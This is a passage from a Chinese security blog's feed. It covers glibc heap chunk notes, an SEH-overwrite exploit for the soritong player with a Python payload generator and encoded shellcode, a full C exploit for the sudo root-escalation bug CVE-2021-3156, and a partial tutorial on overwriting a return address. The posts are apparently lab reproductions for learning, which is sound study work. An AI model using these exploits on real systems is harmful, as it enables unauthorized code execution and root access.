src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016142156.png" alt="第二次，使用删除功能"></p><p>之后我们就能显示出flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016142446.png" alt="效果"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="linux-堆块结构体"><a href="#linux-堆块结构体" class="headerlink" title="linux 堆块结构体"></a>linux 堆块结构体</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">&#x2F;*  This struct declaration is misleading (but accurate and necessary).  It declares a &quot;view&quot; into memory allowing access to necessary  fields at known offsets from a given base. See explanation below.*&#x2F;struct malloc_chunk &#123;  INTERNAL_SIZE_T      prev_size;  &#x2F;* Size of previous chunk (if free).  *&#x2F;  INTERNAL_SIZE_T      size;       &#x2F;* Size in bytes, including overhead. *&#x2F;  struct malloc_chunk* fd;         &#x2F;* double links -- used only if free. *&#x2F;  struct malloc_chunk* bk;  &#x2F;* Only used for large blocks: pointer to next larger size.  *&#x2F;  struct malloc_chunk* fd_nextsize; &#x2F;* double links -- used only if free. *&#x2F;  struct malloc_chunk* bk_nextsize;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>prev_size, 如果该 chunk 的物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 。</li><li>size ，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<br>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。<br>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。<br>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li><li>fd，bk。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<br>fd 指向下一个（非物理相邻）空闲的 chunk<br>bk 指向上一个（非物理相邻）空闲的 chunk<br>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li><li>fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<br>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。<br>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。<br>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。</li></ul><h3 id="CALL指令"><a href="#CALL指令" class="headerlink" title="CALL指令"></a>CALL指令</h3><p>CALL（LCALL）指令执行时，进行两步操作：<br>（1）将程序下一条指令的位置的IP压入堆栈中；<br>（2）转移到调用的子程序。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞复现-栈溢出+堆溢出sudo提权</title>
      <link href="/2022/10/11/lou-dong-fu-xian-zhan-yi-chu-dui-yi-chu-sudo-ti-quan/"/>
      <url>/2022/10/11/lou-dong-fu-xian-zhan-yi-chu-dui-yi-chu-sudo-ti-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞复现-栈溢出-堆溢出sudo提权"><a href="#漏洞复现-栈溢出-堆溢出sudo提权" class="headerlink" title="漏洞复现-栈溢出+堆溢出sudo提权"></a>漏洞复现-栈溢出+堆溢出sudo提权</h1><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>通过栈溢出的方式，将异常处理指针覆盖。从而控制程序执行流。</p><p>SEH是什么<br>SEH中文名结构异常化处理，是一种Windows机制，用于一致地处理硬件和软件异常。</p><p>在C#/java/C等语言中可以自定义处理异常，使用try/catch语句。C++也可以抛出异常，C#定义一个基类，所有的异常都继承这个基类。<br>操作系统为每个进程提供了一个异常处理机制，这个异常处理机制的地址、参数保存在栈中，这就是溢出的原因。SEH会动态发生改变。若程序里没有提供异常处理机制，则会将其交给操作系统处理。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011153031.png" alt="Windows SEH"></p><p>图中可以看到，SEH chain在堆栈上并非连续的，每一节由一个_EXCEPTION_REGISTRATION_RECORD处理函数组成，每个_EXCEPTION_REGISTRATION_RECORD处理函数具有两个指针，一个指向next SEH，即下一个SEH的地址；一个是当前SEH handler。</p><p>在这个单向链表中，头部位于FS:[0]段，保存了异常链的首地址。</p><p>在处理函数_except_handler中有四个参数，第一个参数是指向_EXCEPTION_RECORD结构的指针，该结构包含有关给定异常的信息，包括异常代码，异常地址和参数数量。_except_handler函数用这些信息和第三个参数ContextRecord的信息，来确定这个异常是否可以由当前处理器处理，_except_handler返回EXCEPTION_DISPOSITION，如果为ExceptionContinueExecution，表示该异常是否已经被成功处理，如果为ExceptionContinueSearch，表示当前异常处理器无法处理该异常，则根据nSEH指针中的地址找下一个处理器，重复以找到合适可以处理异常的处理器。<br>第二个参数在利用中很关键，它的值为nSEH。在堆栈上位于ESP+8的位置，这样我们就可以控制这第二个参数来进行跳转了。</p><p>尾部_EXCEPTION_REGISTRATION_RECORD处理函数的nSEH指针指向FFFFFFFF，标志着End of SEH chain。Windows在链的末尾放置一个默认（或者说通用的）异常处理程序，以帮助确保以某种方式处理异常。这时可能会弹框看到“ …遇到问题，需要关闭 ”</p><h3 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h3><ol><li>部署winxpSP3虚拟机镜像,安装soritong</li><li>利用kali生成一个包含模式字符串的ui.txt<br><code>usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000 &gt; ui.txt</code></li><li>将ui.txt复制到soritong目录下的\Skin\Default目录中</li><li>使用windbg调试soritong，加载进去之后，先选用debug菜单中的go handled exception, 紧接着选用go unhandled exception.</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154339.png" alt="windbg调试"></p><ol start="5"><li>可以看到eip被覆盖为了0x41367441, 也就是A6tA。然后我们利用kali查找A6tA在模式字符串中的位置，<br><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q At6A  </code></li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154410.png" alt="确定溢出位置"></p><p>发现其处于588的位置，由于当异常发生时，程序会跳转到SEH handler去执行，通过将这个handler的值设置为程序自带模块的一个pop/pop/ret地址，能够实现程序跳转到next seh pointer去，在next seh中需要做的就是跳转到shellcode执行。将next seh的值弹到了eip而已。shellcode的布局大致如下：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154457.png" alt="shellcode"></p><p>然后我们可以去找，程序中自带的pop+pop+ret的地址。在windbg中输入lm，可以找到程序会使用的模块。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154518.png" alt="lm"></p><ol start="6"><li>再利用windbug 命令 s +首地址+尾地址+5f 5e c3(pop/pop/ret的机器码)去寻找这些指令。最终在Play模块中成功找到。需要注意的是，这里面不是每一个模块都能用。需要尝试几次 <code>s 10000000 10094000 5f 5e c3</code></li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154600.png" alt="pop+pop+ret"></p><p>随机挑一个 0x10014499 作为填充seh的内容。这里再解释一下pop pop ret指令的作用，当异常发生的时候，异常分发器创建自己的栈帧，会将EH handler成员压入新创的栈帧中，在EH结构中有一个域是EstablisherFrame。这个域指向异常注册记录(next seh)的地址并被压入栈中，当一个函数被调用的时候被压入的这个值是位于ESP+8的地方。使用pop pop ret后，就会将next seh的地址放到EIP中。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154640.png" alt="except_handler"></p><p>因为shellcode在运行的过程会操作栈空间，所以我们需要在栈空间中留出一小部分。在shellcode前后最好都要留出空位。这样执行成功率比较大。如果执行不成功，就尝试加大空位的大小。</p><p>最终的shellcode就是</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">junk:584字节 ‘A’next seh:”\xeb\x46\x90\x90” (jmp跳转指令)seh:”\x99\x44\x01\x10”junk2: ‘\x90’*64shellcode：弹个计算器.也可以在网上找 可以使用kali的msfvenom生成，但是有的不能运行。junk3 ‘\x90’*1000  必须要填充，否则没有办法执行呢！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个python需要用pyhon2.5生成！</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">"ui.txt"</span>data <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">584</span>nextseh <span class="token operator">=</span> <span class="token string">"\xeb\x46\x90\x90"</span>seh <span class="token operator">=</span> <span class="token string">"\x99\x44\x01\x10"</span>junk2<span class="token operator">=</span><span class="token string">"\x90"</span><span class="token operator">*</span><span class="token number">64</span>shellcode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"</span><span class="token string">"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"</span><span class="token string">"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"</span><span class="token string">"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"</span><span class="token string">"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"</span><span class="token string">"\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37"</span><span class="token string">"\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48"</span><span class="token string">"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48"</span><span class="token string">"\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c"</span><span class="token string">"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"</span><span class="token string">"\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48"</span><span class="token string">"\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54"</span><span class="token string">"\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48"</span><span class="token string">"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43"</span><span class="token string">"\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57"</span><span class="token string">"\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a"</span><span class="token string">"\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b"</span><span class="token string">"\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53"</span><span class="token string">"\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37"</span><span class="token string">"\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49"</span><span class="token string">"\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46"</span><span class="token string">"\x4e\x36\x43\x46\x42\x50\x5a"</span><span class="token punctuation">)</span>junk3 <span class="token operator">=</span> <span class="token string">"\x90"</span><span class="token operator">*</span><span class="token number">1000</span>data <span class="token operator">=</span> data <span class="token operator">+</span> nextseh <span class="token operator">+</span> seh <span class="token operator">+</span> junk2<span class="token operator">+</span> shellcode <span class="token operator">+</span> junk3f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/">http://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/</a>  (讲windows seh的,写的非常详细)</li><li><a href="https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2014/04/07/seh-exploit">https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2014/04/07/seh-exploit</a> (讲如何溢出soritong.exe的)</li><li><a href="https://www.cnblogs.com/cjhk/p/11598690.html">https://www.cnblogs.com/cjhk/p/11598690.html</a> —–C语言中的转义字符</li><li><a href="http://c.biancheng.net/c/ascii/">http://c.biancheng.net/c/ascii/</a>  —–ascii</li><li><a href="https://pukrr.github.io/2020/05/05/%E5%88%A9%E7%94%A8SEH%E9%93%BE%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">https://pukrr.github.io/2020/05/05/%E5%88%A9%E7%94%A8SEH%E9%93%BE%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</a></li></ul><h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><p>sudo是Linux中一个非常重要的管理权限的软件，它允许用户使用 root 权限来运行程序。而CVE-2021-3156是sudo中存在一个堆溢出漏洞。通过该漏洞，任何没有特权的用户均可使用默认的sudo配置获取root权限。</p><p>该漏洞可以影响从1.8.2~1.8.31p2下的所有旧版本sudo</p><p>在主要参考的资料中，已经对该漏洞的成因介绍的非常详细了。所以在这里只总结一些自认为比较细节的地方把。</p><h3 id="细节问题"><a href="#细节问题" class="headerlink" title="细节问题"></a>细节问题</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include&lt;math.h&gt;#define __LC_CTYPE               0#define __LC_NUMERIC             1#define __LC_TIME                2#define __LC_COLLATE             3#define __LC_MONETARY            4#define __LC_MESSAGES            5#define __LC_ALL                 6#define __LC_PAPER               7#define __LC_NAME                8#define __LC_ADDRESS             9#define __LC_TELEPHONE          10#define __LC_MEASUREMENT        11#define __LC_IDENTIFICATION     12char * envName[13]&#x3D;&#123;&quot;LC_CTYPE&quot;,&quot;LC_NUMERIC&quot;,&quot;LC_TIME&quot;,&quot;LC_COLLATE&quot;,&quot;LC_MONETARY&quot;,&quot;LC_MESSAGES&quot;,&quot;LC_ALL&quot;,&quot;LC_PAPER&quot;,&quot;LC_NAME&quot;,&quot;LC_ADDRESS&quot;,&quot;LC_TELEPHONE&quot;,&quot;LC_MEASUREMENT&quot;,&quot;LC_IDENTIFICATION&quot;&#125;;int now&#x3D;13;int envnow&#x3D;0;int argvnow&#x3D;0;char * envp[0x300];char * argv[0x300];char * addChunk(int size)&#123;    now --;    char * result;    if(now &#x3D;&#x3D;6)    &#123;        now --;    &#125;    if(now&gt;&#x3D;0)    &#123;        result&#x3D;malloc(size+0x20);        strcpy(result,envName[now]);        strcat(result,&quot;&#x3D;C.UTF-8@&quot;);        for(int i&#x3D;9;i&lt;&#x3D;size-0x17;i++)            strcat(result,&quot;A&quot;);        envp[envnow++]&#x3D;result;    &#125;    return result;&#125;void final()&#123;    now --;    char * result;    if(now &#x3D;&#x3D;6)    &#123;        now --;    &#125;    if(now&gt;&#x3D;0)    &#123;        result&#x3D;malloc(0x100);        strcpy(result,envName[now]);        strcat(result,&quot;&#x3D;xxxxxxxxxxxxxxxxxxxxx&quot;);        envp[envnow++]&#x3D;result;    &#125;&#125;int setargv(int size,int offset)&#123;    size-&#x3D;0x10;    signed int x,y;    signed int a&#x3D;-3;    signed int b&#x3D;2*size-3;    signed int c&#x3D;2*size-2-offset*2;    signed int tmp&#x3D;b*b-4*a*c;    if(tmp&lt;0)        return -1;    tmp&#x3D;(signed int)sqrt((double)tmp*1.0);    signed int A&#x3D;(0-b+tmp)&#x2F;(2*a);    signed int B&#x3D;(0-b-tmp)&#x2F;(2*a);    if(A&lt;0 &amp;&amp; B&lt;0)        return -1;    if((A&gt;0 &amp;&amp; B&lt;0) || (A&lt;0 &amp;&amp; B&gt;0))        x&#x3D;(A&gt;0) ? A: B;    if(A&gt;0 &amp;&amp; B &gt; 0)        x&#x3D;(A&lt;B) ? A : B;    y&#x3D;size-1-x*2;    int len&#x3D;x+y+(x+y+y+1)*x&#x2F;2;    while ((signed int)(offset-len)&lt;2)    &#123;        x--;        y&#x3D;size-1-x*2;        len&#x3D;x+y+(x+y+1)*x&#x2F;2;        if(x&lt;0)            return -1;    &#125;    int envoff&#x3D;offset-len-2+0x30;    printf(&quot;%d,%d,%d\n&quot;,x,y,len);    char * Astring&#x3D;malloc(size);    int i&#x3D;0;    for(i&#x3D;0;i&lt;y;i++)        Astring[i]&#x3D;&#39;A&#39;;    Astring[i]&#x3D;&#39;\x00&#39;;    argv[argvnow++]&#x3D;&quot;sudoedit&quot;;    argv[argvnow++]&#x3D;&quot;-s&quot;;    for (i&#x3D;0;i&lt;x;i++)        argv[argvnow++]&#x3D;&quot;\\&quot;;    argv[argvnow++]&#x3D;Astring;    argv[argvnow++]&#x3D;&quot;\\&quot;;    argv[argvnow++]&#x3D;NULL;    for(i&#x3D;0;i&lt;envoff;i++)        envp[envnow++]&#x3D;&quot;\\&quot;;    envp[envnow++]&#x3D;&quot;X&#x2F;test&quot;;    return 0;&#125;int main()&#123;    setargv(0xa0,0x650);    addChunk(0x40);    addChunk(0x40);    addChunk(0xa0);    addChunk(0x40);    final();    execve(&quot;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;sudoedit&quot;,argv,envp);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>要覆盖的name成员在0x30的偏移位置</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011160159.png" alt="pwndbg 调试"></p><ol start="2"><li>Exp中addChunk()函数 </li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011160246.png" alt="addChunk"></p><p>循环赋值a的时候，i=9是因为前面已经有了9个字符。</p><p>为什么在循环的地方会减去一个<code>0x17</code>？</p><p>经过对比更改数值过后，在<code>setlocale</code>函数运行完毕之后的堆空间分布。</p><p>我的理解是这样的，他为了确保<code>0xa0</code>的堆空间 与 最后一个<code>0x40</code> 的堆空间之间的距离刚好是0x650。如果硬要减去一个不同的值，<code>0xa0</code> 与 <code>0x40</code> 之间堆空间的距离会被拉大。当然这其中还要考虑到堆空间是16字节对齐的问题。那么这个时候，<code>0xa0</code> 与 <code>0x40</code> 堆空间的距离有可能会发生变化。据我调试观察发现，这个距离有可能是<code>0x650\0x660\0x670</code></p><p>至于这个距离为什么会变化，还要看<code>setlocale.c</code>中的<code>_nl_find_locale</code>函数位于<code>glibc/locale/findlocale.c</code>。以及<code>_nl_make_l0nflist</code>函数—位于<code>glibc/intl/l0nflist.c</code>。这些函数中会对堆空间继续进行处理。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011160505.png" alt="-0x17"></p><ol start="3"><li>Exp中的finally()函数</li></ol><p>之所以在构造环境变量的过程中我们多使用了一个<code>LC_NAME==xxxxxxxxxxxxxxxxxxxxx</code>。就是因为这里释放的时候，他先将category++。所以就造成了，只有多出来一个。<code>++category</code>之后才能刚好移动到我们想要释放的大小空间上。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011160753.png" alt="glibc/locale/setlocale.c"></p><ol start="4"><li>为什么认为nsswitch.c中__getline分配的堆空间为0x80</li></ol><p>通过阅读源码可以发现，在调用的过程中，如果<code>size_t *n</code> 为0的话，会直接给一个<code>120(0x78)</code>，的大小，而一般堆空间都是要对齐的，32位和64的情况不同，分别是8字节和16字节对齐。再加上配置文件中一行的占用大小远远小于120，所以后续不会重新分配一个更大的空间，后续每一次调用这个__getline都会使用这个堆空间。综上，nsswitch.c中的__getline会申请一个0x80的堆空间大小。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011161002.png" alt="libio/iogetdelim.c/_IO_getdelim"></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><h4 id="docker环境"><a href="#docker环境" class="headerlink" title="docker环境"></a>docker环境</h4><ul><li><a href="https://hub.docker.com/r/chenaotian/cve-2021-3156">https://hub.docker.com/r/chenaotian/cve-2021-3156</a></li></ul><h4 id="主要参考"><a href="#主要参考" class="headerlink" title="主要参考"></a>主要参考</h4><ul><li><a href="https://blog.csdn.net/Breeze_CAT/article/details/122676551">https://blog.csdn.net/Breeze_CAT/article/details/122676551</a></li><li><a href="https://github.com/chenaotian/CVE-2021-3156">https://github.com/chenaotian/CVE-2021-3156</a></li><li><a href="https://github.dev/lattera/glibc/blob/master/nss/nsswitch.c">https://github.dev/lattera/glibc/blob/master/nss/nsswitch.c —-github按下<code>&gt;</code>可以启动网页版的vscode可以看glibc的源码</a></li></ul><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li><a href="https://www.cnblogs.com/panwenbin-logs/p/16050472.html">https://www.cnblogs.com/panwenbin-logs/p/16050472.html   —-NSS细节</a></li><li><a href="https://www.cnblogs.com/dylancao/p/10677660.html">https://www.cnblogs.com/dylancao/p/10677660.html —-strdup()</a></li><li><a href="https://www.xiexianbin.cn/linux/basic/linux-nssswitch/index.html">https://www.xiexianbin.cn/linux/basic/linux-nssswitch/index.html —-Linux nsswithch.conf 详解</a></li><li><a href="https://www.cnblogs.com/murkuo/p/15965270.html">https://www.cnblogs.com/murkuo/p/15965270.html —-pwndbg基本操作</a></li><li><a href="https://blog.csdn.net/zhang14916/article/details/108319252">https://blog.csdn.net/zhang14916/article/details/108319252 —-libc 2.27 堆管理机制</a></li><li><a href="https://kiprey.github.io/2021/01/CVE-2021-3156/#b-POC">https://kiprey.github.io/2021/01/CVE-2021-3156/#b-POC</a></li><li><a href="https://www.anquanke.com/post/id/231077#h2-4">https://www.anquanke.com/post/id/231077#h2-4</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞浮现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
            <tag> 堆溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-PWN-平衡栈帧</title>
      <link href="/2022/09/17/ctf-zhan-ping-heng/"/>
      <url>/2022/09/17/ctf-zhan-ping-heng/</url>
      
        <content type="html"><![CDATA[<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="第一讲–初始"><a href="#第一讲–初始" class="headerlink" title="第一讲–初始"></a>第一讲–初始</h2><p><strong>先说明，以下讨论均在32位机器下进行讨论！</strong></p><p>这个栈溢出的例子,我是从b站up主Innks那里看到的。因为有些细节不理解，所以动手敲了一遍。</p><h3 id="改进之前"><a href="#改进之前" class="headerlink" title="改进之前"></a>改进之前</h3><p>改进之前由于没有平衡栈空间，导致栈空间被破坏，程序无法正确返回。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">optimize</span><span class="token punctuation">(</span></span><span class="token string">""</span><span class="token expression"><span class="token punctuation">,</span>off<span class="token punctuation">)</span></span></span><span class="token keyword">void</span> <span class="token function">MsgBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> ary<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> ary<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//相当于把ret返回地址复制了一遍</span>    ary<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>MessageBoxA<span class="token punctuation">;</span>    <span class="token comment">//ary[4] = ary[3]; //这条指令写到这个位置和写在上面一个位置是完全不一样的哟！</span>    ary<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"NO_CALL 恭喜你中毒了"</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"NO_CALL 你中毒了"</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> MB_OK<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">MsgBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"恭喜你中毒了"</span><span class="token punctuation">,</span> <span class="token string">"你中毒了"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="改进之后"><a href="#改进之后" class="headerlink" title="改进之后"></a>改进之后</h3><p>改进之后，可以正确的让程序结束</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">optimize</span><span class="token punctuation">(</span></span><span class="token string">""</span><span class="token expression"><span class="token punctuation">,</span>off<span class="token punctuation">)</span></span></span><span class="token keyword">void</span> <span class="token function">MsgBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> ary<span class="token punctuation">[</span><span class="token number">2</span><span class="token 